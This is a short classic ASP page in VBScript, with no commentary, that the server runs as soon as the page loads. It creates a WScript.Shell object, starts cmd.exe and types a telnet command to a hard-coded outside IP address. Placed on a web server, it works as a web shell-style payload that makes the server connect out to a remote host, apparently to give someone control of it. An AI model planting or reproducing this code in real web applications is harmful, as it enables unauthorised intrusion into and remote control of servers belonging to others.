<%@ Language=VBScript %>
<%
Dim oScript

Set oScript = Server.CreateObject("WSCRIPT.SHELL")

oScript.Run "cmd.exe"

oScript.SendKeys "telnet 211.233.50.206"
oScript.SendKeys "{ENTER}"
%>